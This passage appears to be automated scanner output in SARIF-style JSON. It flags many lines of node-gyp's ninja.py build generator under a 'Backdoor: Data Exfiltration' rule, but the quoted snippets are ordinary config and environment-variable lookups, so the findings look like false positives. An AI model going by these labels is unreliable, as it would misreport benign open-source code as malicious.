                    "text": "    generator_dir = os.path.relpath(params[\"options\"].generator_output or \".\")\n\n    # output_dir: relative path from generator_dir to the build directory.\n    output_dir = params.get(\"generator_flags\", {}).get(\"output_dir\", \"out\")\n\n    # Relative path from source root to our output files.  e.g. \"out\"\n    return os.path.normpath(os.path.join(generator_dir, output_dir))\n",
                    "rendered": {
                      "text": "    generator_dir = os.path.relpath(params[\"options\"].generator_output or \".\")\n\n    # output_dir: relative path from generator_dir to the build directory.\n    output_dir = params.get(\"generator_flags\", {}).get(\"output_dir\", \"out\")\n\n    # Relative path from source root to our output files.  e.g. \"out\"\n    return os.path.normpath(os.path.join(generator_dir, output_dir))\n",
                      "markdown": "`    generator_dir = os.path.relpath(params[\"options\"].generator_output or \".\")\n\n    # output_dir: relative path from generator_dir to the build directory.\n    output_dir = params.get(\"generator_flags\", {}).get(\"output_dir\", \"out\")\n\n    # Relative path from source root to our output files.  e.g. \"out\"\n    return os.path.normpath(os.path.join(generator_dir, output_dir))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 1819,
                  "startColumn": 71,
                  "endLine": 1819,
                  "endColumn": 76,
                  "snippet": {
                    "text": "            \"executable\": default_variables[\"EXECUTABLE_SUFFIX\"],\n        }\n        extension = spec.get(\"product_extension\")\n        extension = \".\" + extension if extension else DEFAULT_EXTENSION.get(type, \"\")\n\n        if \"product_name\" in spec:\n            # If we were given an explicit name, use that.\n",
                    "rendered": {
                      "text": "            \"executable\": default_variables[\"EXECUTABLE_SUFFIX\"],\n        }\n        extension = spec.get(\"product_extension\")\n        extension = \".\" + extension if extension else DEFAULT_EXTENSION.get(type, \"\")\n\n        if \"product_name\" in spec:\n            # If we were given an explicit name, use that.\n",
                      "markdown": "`            \"executable\": default_variables[\"EXECUTABLE_SUFFIX\"],\n        }\n        extension = spec.get(\"product_extension\")\n        extension = \".\" + extension if extension else DEFAULT_EXTENSION.get(type, \"\")\n\n        if \"product_name\" in spec:\n            # If we were given an explicit name, use that.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 1818,
                  "startColumn": 24,
                  "endLine": 1818,
                  "endColumn": 29,
                  "snippet": {
                    "text": "            \"static_library\": default_variables[\"STATIC_LIB_SUFFIX\"],\n            \"executable\": default_variables[\"EXECUTABLE_SUFFIX\"],\n        }\n        extension = spec.get(\"product_extension\")\n        extension = \".\" + extension if extension else DEFAULT_EXTENSION.get(type, \"\")\n\n        if \"product_name\" in spec:\n",
                    "rendered": {
                      "text": "            \"static_library\": default_variables[\"STATIC_LIB_SUFFIX\"],\n            \"executable\": default_variables[\"EXECUTABLE_SUFFIX\"],\n        }\n        extension = spec.get(\"product_extension\")\n        extension = \".\" + extension if extension else DEFAULT_EXTENSION.get(type, \"\")\n\n        if \"product_name\" in spec:\n",
                      "markdown": "`            \"static_library\": default_variables[\"STATIC_LIB_SUFFIX\"],\n            \"executable\": default_variables[\"EXECUTABLE_SUFFIX\"],\n        }\n        extension = spec.get(\"product_extension\")\n        extension = \".\" + extension if extension else DEFAULT_EXTENSION.get(type, \"\")\n\n        if \"product_name\" in spec:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 1808,
                  "startColumn": 58,
                  "endLine": 1808,
                  "endColumn": 63,
                  "snippet": {
                    "text": "            \"static_library\": default_variables[\"STATIC_LIB_PREFIX\"],\n            \"executable\": default_variables[\"EXECUTABLE_PREFIX\"],\n        }\n        prefix = spec.get(\"product_prefix\", DEFAULT_PREFIX.get(type, \"\"))\n\n        # Compute filename extension: the product extension, or a default\n        # for the product type.\n",
                    "rendered": {
                      "text": "            \"static_library\": default_variables[\"STATIC_LIB_PREFIX\"],\n            \"executable\": default_variables[\"EXECUTABLE_PREFIX\"],\n        }\n        prefix = spec.get(\"product_prefix\", DEFAULT_PREFIX.get(type, \"\"))\n\n        # Compute filename extension: the product extension, or a default\n        # for the product type.\n",
                      "markdown": "`            \"static_library\": default_variables[\"STATIC_LIB_PREFIX\"],\n            \"executable\": default_variables[\"EXECUTABLE_PREFIX\"],\n        }\n        prefix = spec.get(\"product_prefix\", DEFAULT_PREFIX.get(type, \"\"))\n\n        # Compute filename extension: the product extension, or a default\n        # for the product type.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 1808,
                  "startColumn": 21,
                  "endLine": 1808,
                  "endColumn": 26,
                  "snippet": {
                    "text": "            \"static_library\": default_variables[\"STATIC_LIB_PREFIX\"],\n            \"executable\": default_variables[\"EXECUTABLE_PREFIX\"],\n        }\n        prefix = spec.get(\"product_prefix\", DEFAULT_PREFIX.get(type, \"\"))\n\n        # Compute filename extension: the product extension, or a default\n        # for the product type.\n",
                    "rendered": {
                      "text": "            \"static_library\": default_variables[\"STATIC_LIB_PREFIX\"],\n            \"executable\": default_variables[\"EXECUTABLE_PREFIX\"],\n        }\n        prefix = spec.get(\"product_prefix\", DEFAULT_PREFIX.get(type, \"\"))\n\n        # Compute filename extension: the product extension, or a default\n        # for the product type.\n",
                      "markdown": "`            \"static_library\": default_variables[\"STATIC_LIB_PREFIX\"],\n            \"executable\": default_variables[\"EXECUTABLE_PREFIX\"],\n        }\n        prefix = spec.get(\"product_prefix\", DEFAULT_PREFIX.get(type, \"\"))\n\n        # Compute filename extension: the product extension, or a default\n        # for the product type.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 1576,
                  "startColumn": 27,
                  "endLine": 1576,
                  "endColumn": 32,
                  "snippet": {
                    "text": "    def WriteTarget(self, spec, config_name, config, link_deps, compile_deps):\n        extra_link_deps = any(\n            self.target_outputs.get(dep).Linkable()\n            for dep in spec.get(\"dependencies\", [])\n            if dep in self.target_outputs\n        )\n        if spec[\"type\"] == \"none\" or (not link_deps and not extra_link_deps):\n",
                    "rendered": {
                      "text": "    def WriteTarget(self, spec, config_name, config, link_deps, compile_deps):\n        extra_link_deps = any(\n            self.target_outputs.get(dep).Linkable()\n            for dep in spec.get(\"dependencies\", [])\n            if dep in self.target_outputs\n        )\n        if spec[\"type\"] == \"none\" or (not link_deps and not extra_link_deps):\n",
                      "markdown": "`    def WriteTarget(self, spec, config_name, config, link_deps, compile_deps):\n        extra_link_deps = any(\n            self.target_outputs.get(dep).Linkable()\n            for dep in spec.get(\"dependencies\", [])\n            if dep in self.target_outputs\n        )\n        if spec[\"type\"] == \"none\" or (not link_deps and not extra_link_deps):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 1575,
                  "startColumn": 31,
                  "endLine": 1575,
                  "endColumn": 36,
                  "snippet": {
                    "text": "\n    def WriteTarget(self, spec, config_name, config, link_deps, compile_deps):\n        extra_link_deps = any(\n            self.target_outputs.get(dep).Linkable()\n            for dep in spec.get(\"dependencies\", [])\n            if dep in self.target_outputs\n        )\n",
                    "rendered": {
                      "text": "\n    def WriteTarget(self, spec, config_name, config, link_deps, compile_deps):\n        extra_link_deps = any(\n            self.target_outputs.get(dep).Linkable()\n            for dep in spec.get(\"dependencies\", [])\n            if dep in self.target_outputs\n        )\n",
                      "markdown": "`\n    def WriteTarget(self, spec, config_name, config, link_deps, compile_deps):\n        extra_link_deps = any(\n            self.target_outputs.get(dep).Linkable()\n            for dep in spec.get(\"dependencies\", [])\n            if dep in self.target_outputs\n        )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 1496,
                  "startColumn": 40,
                  "endLine": 1496,
                  "endColumn": 45,
                  "snippet": {
                    "text": "            ]\n\n        libraries = gyp.common.uniquer(\n            map(self.ExpandSpecial, spec.get(\"libraries\", []))\n        )\n        if self.flavor == \"mac\":\n            libraries = self.xcode_settings.AdjustLibraries(libraries, config_name)\n",
                    "rendered": {
                      "text": "            ]\n\n        libraries = gyp.common.uniquer(\n            map(self.ExpandSpecial, spec.get(\"libraries\", []))\n        )\n        if self.flavor == \"mac\":\n            libraries = self.xcode_settings.AdjustLibraries(libraries, config_name)\n",
                      "markdown": "`            ]\n\n        libraries = gyp.common.uniquer(\n            map(self.ExpandSpecial, spec.get(\"libraries\", []))\n        )\n        if self.flavor == \"mac\":\n            libraries = self.xcode_settings.AdjustLibraries(libraries, config_name)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 1478,
                  "startColumn": 29,
                  "endLine": 1478,
                  "endColumn": 34,
                  "snippet": {
                    "text": "                ldflags.append(\"-Wl,-rpath-link=%s\" % rpath)\n        self.WriteVariableList(ninja_file, \"ldflags\", map(self.ExpandSpecial, ldflags))\n\n        library_dirs = config.get(\"library_dirs\", [])\n        if self.flavor == \"win\":\n            library_dirs = [\n                self.msvs_settings.ConvertVSMacros(library_dir, config_name)\n",
                    "rendered": {
                      "text": "                ldflags.append(\"-Wl,-rpath-link=%s\" % rpath)\n        self.WriteVariableList(ninja_file, \"ldflags\", map(self.ExpandSpecial, ldflags))\n\n        library_dirs = config.get(\"library_dirs\", [])\n        if self.flavor == \"win\":\n            library_dirs = [\n                self.msvs_settings.ConvertVSMacros(library_dir, config_name)\n",
                      "markdown": "`                ldflags.append(\"-Wl,-rpath-link=%s\" % rpath)\n        self.WriteVariableList(ninja_file, \"ldflags\", map(self.ExpandSpecial, ldflags))\n\n        library_dirs = config.get(\"library_dirs\", [])\n        if self.flavor == \"win\":\n            library_dirs = [\n                self.msvs_settings.ConvertVSMacros(library_dir, config_name)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 1467,
                  "startColumn": 42,
                  "endLine": 1467,
                  "endColumn": 47,
                  "snippet": {
                    "text": "        else:\n            # Respect environment variables related to build, but target-specific\n            # flags can still override them.\n            ldflags = env_ldflags + config.get(\"ldflags\", [])\n            if is_executable and len(solibs):\n                rpath = \"lib/\"\n                if self.toolset != \"target\":\n",
                    "rendered": {
                      "text": "        else:\n            # Respect environment variables related to build, but target-specific\n            # flags can still override them.\n            ldflags = env_ldflags + config.get(\"ldflags\", [])\n            if is_executable and len(solibs):\n                rpath = \"lib/\"\n                if self.toolset != \"target\":\n",
                      "markdown": "`        else:\n            # Respect environment variables related to build, but target-specific\n            # flags can still override them.\n            ldflags = env_ldflags + config.get(\"ldflags\", [])\n            if is_executable and len(solibs):\n                rpath = \"lib/\"\n                if self.toolset != \"target\":\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 1424,
                  "startColumn": 36,
                  "endLine": 1424,
                  "endColumn": 41,
                  "snippet": {
                    "text": "        if self.toolset == \"target\":\n            env_ldflags = os.environ.get(\"LDFLAGS\", \"\").split()\n        elif self.toolset == \"host\":\n            env_ldflags = os.environ.get(\"LDFLAGS_host\", \"\").split()\n\n        if self.flavor == \"mac\":\n            ldflags = self.xcode_settings.GetLdflags(\n",
                    "rendered": {
                      "text": "        if self.toolset == \"target\":\n            env_ldflags = os.environ.get(\"LDFLAGS\", \"\").split()\n        elif self.toolset == \"host\":\n            env_ldflags = os.environ.get(\"LDFLAGS_host\", \"\").split()\n\n        if self.flavor == \"mac\":\n            ldflags = self.xcode_settings.GetLdflags(\n",
                      "markdown": "`        if self.toolset == \"target\":\n            env_ldflags = os.environ.get(\"LDFLAGS\", \"\").split()\n        elif self.toolset == \"host\":\n            env_ldflags = os.environ.get(\"LDFLAGS_host\", \"\").split()\n\n        if self.flavor == \"mac\":\n            ldflags = self.xcode_settings.GetLdflags(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 1422,
                  "startColumn": 36,
                  "endLine": 1422,
                  "endColumn": 41,
                  "snippet": {
                    "text": "        # The ldflags config key is not used on mac or win. On those platforms\n        # linker flags are set via xcode_settings and msvs_settings, respectively.\n        if self.toolset == \"target\":\n            env_ldflags = os.environ.get(\"LDFLAGS\", \"\").split()\n        elif self.toolset == \"host\":\n            env_ldflags = os.environ.get(\"LDFLAGS_host\", \"\").split()\n\n",
                    "rendered": {
                      "text": "        # The ldflags config key is not used on mac or win. On those platforms\n        # linker flags are set via xcode_settings and msvs_settings, respectively.\n        if self.toolset == \"target\":\n            env_ldflags = os.environ.get(\"LDFLAGS\", \"\").split()\n        elif self.toolset == \"host\":\n            env_ldflags = os.environ.get(\"LDFLAGS_host\", \"\").split()\n\n",
                      "markdown": "`        # The ldflags config key is not used on mac or win. On those platforms\n        # linker flags are set via xcode_settings and msvs_settings, respectively.\n        if self.toolset == \"target\":\n            env_ldflags = os.environ.get(\"LDFLAGS\", \"\").split()\n        elif self.toolset == \"host\":\n            env_ldflags = os.environ.get(\"LDFLAGS_host\", \"\").split()\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 1380,
                  "startColumn": 44,
                  "endLine": 1380,
                  "endColumn": 49,
                  "snippet": {
                    "text": "            #   and writes a stamp file): add them to implicit_deps\n            extra_link_deps = set()\n            for dep in spec[\"dependencies\"]:\n                target = self.target_outputs.get(dep)\n                if not target:\n                    continue\n                linkable = target.Linkable()\n",
                    "rendered": {
                      "text": "            #   and writes a stamp file): add them to implicit_deps\n            extra_link_deps = set()\n            for dep in spec[\"dependencies\"]:\n                target = self.target_outputs.get(dep)\n                if not target:\n                    continue\n                linkable = target.Linkable()\n",
                      "markdown": "`            #   and writes a stamp file): add them to implicit_deps\n            extra_link_deps = set()\n            for dep in spec[\"dependencies\"]:\n                target = self.target_outputs.get(dep)\n                if not target:\n                    continue\n                linkable = target.Linkable()\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 1305,
                  "startColumn": 21,
                  "endLine": 1305,
                  "endColumn": 26,
                  "snippet": {
                    "text": "                \"m\": \"objc\",\n                \"mm\": \"objcxx\",\n            }\n            cmd = map.get(lang)\n            ninja_file.build(gch, cmd, input, variables=[(var_name, lang_flag)])\n\n    def WriteLink(self, spec, config_name, config, link_deps, compile_deps):\n",
                    "rendered": {
                      "text": "                \"m\": \"objc\",\n                \"mm\": \"objcxx\",\n            }\n            cmd = map.get(lang)\n            ninja_file.build(gch, cmd, input, variables=[(var_name, lang_flag)])\n\n    def WriteLink(self, spec, config_name, config, link_deps, compile_deps):\n",
                      "markdown": "`                \"m\": \"objc\",\n                \"mm\": \"objcxx\",\n            }\n            cmd = map.get(lang)\n            ninja_file.build(gch, cmd, input, variables=[(var_name, lang_flag)])\n\n    def WriteLink(self, spec, config_name, config, link_deps, compile_deps):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 1271,
                  "startColumn": 42,
                  "endLine": 1271,
                  "endColumn": 47,
                  "snippet": {
                    "text": "            outputs.append(output)\n\n        if has_rc_source:\n            resource_include_dirs = config.get(\"resource_include_dirs\", include_dirs)\n            self.WriteVariableList(\n                ninja_file,\n                \"resource_includes\",\n",
                    "rendered": {
                      "text": "            outputs.append(output)\n\n        if has_rc_source:\n            resource_include_dirs = config.get(\"resource_include_dirs\", include_dirs)\n            self.WriteVariableList(\n                ninja_file,\n                \"resource_includes\",\n",
                      "markdown": "`            outputs.append(output)\n\n        if has_rc_source:\n            resource_include_dirs = config.get(\"resource_include_dirs\", include_dirs)\n            self.WriteVariableList(\n                ninja_file,\n                \"resource_includes\",\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 1192,
                  "startColumn": 24,
                  "endLine": 1192,
                  "endColumn": 29,
                  "snippet": {
                    "text": "                if include:\n                    ninja_file.variable(var, include)\n\n        arflags = config.get(\"arflags\", [])\n\n        self.WriteVariableList(ninja_file, \"cflags\", map(self.ExpandSpecial, cflags))\n        self.WriteVariableList(\n",
                    "rendered": {
                      "text": "                if include:\n                    ninja_file.variable(var, include)\n\n        arflags = config.get(\"arflags\", [])\n\n        self.WriteVariableList(ninja_file, \"cflags\", map(self.ExpandSpecial, cflags))\n        self.WriteVariableList(\n",
                      "markdown": "`                if include:\n                    ninja_file.variable(var, include)\n\n        arflags = config.get(\"arflags\", [])\n\n        self.WriteVariableList(ninja_file, \"cflags\", map(self.ExpandSpecial, cflags))\n        self.WriteVariableList(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 1166,
                  "startColumn": 38,
                  "endLine": 1166,
                  "endColumn": 43,
                  "snippet": {
                    "text": "        )\n\n        if self.flavor == \"win\":\n            midl_include_dirs = config.get(\"midl_include_dirs\", [])\n            midl_include_dirs = self.msvs_settings.AdjustMidlIncludeDirs(\n                midl_include_dirs, config_name\n            )\n",
                    "rendered": {
                      "text": "        )\n\n        if self.flavor == \"win\":\n            midl_include_dirs = config.get(\"midl_include_dirs\", [])\n            midl_include_dirs = self.msvs_settings.AdjustMidlIncludeDirs(\n                midl_include_dirs, config_name\n            )\n",
                      "markdown": "`        )\n\n        if self.flavor == \"win\":\n            midl_include_dirs = config.get(\"midl_include_dirs\", [])\n            midl_include_dirs = self.msvs_settings.AdjustMidlIncludeDirs(\n                midl_include_dirs, config_name\n            )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 1149,
                  "startColumn": 29,
                  "endLine": 1149,
                  "endColumn": 34,
                  "snippet": {
                    "text": "                ],\n            )\n\n        include_dirs = config.get(\"include_dirs\", [])\n\n        env = self.GetToolchainEnv()\n        if self.flavor == \"win\":\n",
                    "rendered": {
                      "text": "                ],\n            )\n\n        include_dirs = config.get(\"include_dirs\", [])\n\n        env = self.GetToolchainEnv()\n        if self.flavor == \"win\":\n",
                      "markdown": "`                ],\n            )\n\n        include_dirs = config.get(\"include_dirs\", [])\n\n        env = self.GetToolchainEnv()\n        if self.flavor == \"win\":\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 1130,
                  "startColumn": 24,
                  "endLine": 1130,
                  "endColumn": 29,
                  "snippet": {
                    "text": "                + cflags_cc\n            )\n\n        defines = config.get(\"defines\", []) + extra_defines\n        self.WriteVariableList(\n            ninja_file, \"defines\", [Define(d, self.flavor) for d in defines]\n        )\n",
                    "rendered": {
                      "text": "                + cflags_cc\n            )\n\n        defines = config.get(\"defines\", []) + extra_defines\n        self.WriteVariableList(\n            ninja_file, \"defines\", [Define(d, self.flavor) for d in defines]\n        )\n",
                      "markdown": "`                + cflags_cc\n            )\n\n        defines = config.get(\"defines\", []) + extra_defines\n        self.WriteVariableList(\n            ninja_file, \"defines\", [Define(d, self.flavor) for d in defines]\n        )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 1126,
                  "startColumn": 28,
                  "endLine": 1126,
                  "endColumn": 33,
                  "snippet": {
                    "text": "            )\n            cflags_cc = (\n                os.environ.get(\"CPPFLAGS_host\", \"\").split()\n                + os.environ.get(\"CXXFLAGS_host\", \"\").split()\n                + cflags_cc\n            )\n\n",
                    "rendered": {
                      "text": "            )\n            cflags_cc = (\n                os.environ.get(\"CPPFLAGS_host\", \"\").split()\n                + os.environ.get(\"CXXFLAGS_host\", \"\").split()\n                + cflags_cc\n            )\n\n",
                      "markdown": "`            )\n            cflags_cc = (\n                os.environ.get(\"CPPFLAGS_host\", \"\").split()\n                + os.environ.get(\"CXXFLAGS_host\", \"\").split()\n                + cflags_cc\n            )\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 1125,
                  "startColumn": 26,
                  "endLine": 1125,
                  "endColumn": 31,
                  "snippet": {
                    "text": "                + cflags_c\n            )\n            cflags_cc = (\n                os.environ.get(\"CPPFLAGS_host\", \"\").split()\n                + os.environ.get(\"CXXFLAGS_host\", \"\").split()\n                + cflags_cc\n            )\n",
                    "rendered": {
                      "text": "                + cflags_c\n            )\n            cflags_cc = (\n                os.environ.get(\"CPPFLAGS_host\", \"\").split()\n                + os.environ.get(\"CXXFLAGS_host\", \"\").split()\n                + cflags_cc\n            )\n",
                      "markdown": "`                + cflags_c\n            )\n            cflags_cc = (\n                os.environ.get(\"CPPFLAGS_host\", \"\").split()\n                + os.environ.get(\"CXXFLAGS_host\", \"\").split()\n                + cflags_cc\n            )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 1121,
                  "startColumn": 28,
                  "endLine": 1121,
                  "endColumn": 33,
                  "snippet": {
                    "text": "        elif self.toolset == \"host\":\n            cflags_c = (\n                os.environ.get(\"CPPFLAGS_host\", \"\").split()\n                + os.environ.get(\"CFLAGS_host\", \"\").split()\n                + cflags_c\n            )\n            cflags_cc = (\n",
                    "rendered": {
                      "text": "        elif self.toolset == \"host\":\n            cflags_c = (\n                os.environ.get(\"CPPFLAGS_host\", \"\").split()\n                + os.environ.get(\"CFLAGS_host\", \"\").split()\n                + cflags_c\n            )\n            cflags_cc = (\n",
